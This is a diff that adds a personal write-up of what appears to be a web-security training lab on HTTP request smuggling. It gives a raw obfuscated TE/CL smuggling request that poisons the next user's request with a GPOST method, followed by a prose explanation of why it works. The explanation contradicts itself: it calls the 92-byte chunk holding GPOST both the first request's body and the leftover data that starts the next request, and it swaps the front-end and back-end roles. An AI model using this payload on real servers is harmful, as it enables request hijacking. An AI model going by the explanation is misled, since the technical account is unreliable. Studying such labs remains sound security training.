@@ -1,0 +1,35 @@
+"
+POST / HTTP/1.1
+Host: 0a38007d0491ba1d8913041e00f40075.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+"
+
+
+This was the request to make the next user refreshing the / page to use the GPOST method.
+
+
+When I sent the request, the front-end server processed the Content-Length header and ignored the Transfer-Encoding: chunked due to 
+the unrecognized cow value. So, it treated the request as having a body of length 4.
+
+The back-end server, however, processed the request as chunked due to the presence of the Transfer-Encoding: chunked header. 
+It read the chunk size 5c (92 in decimal) and treated the next 92 bytes as the body of the first request. This included my GPOST request.
+
+When the back-end server finished processing the first request, it started processing the next request from the remaining data in 
+the TCP stream, which started with GPOST. This is why the next request gave the “unrecognized method GPOST” error. The GPOST method 
+isn’t standard and isn’t recognized by the server.
+
+So, by manipulating the HTTP headers and exploiting the differences in how servers process requests, I was able to smuggle a GPOST 
+request to the back-end server. This is the essence of HTTP Request Smuggling.
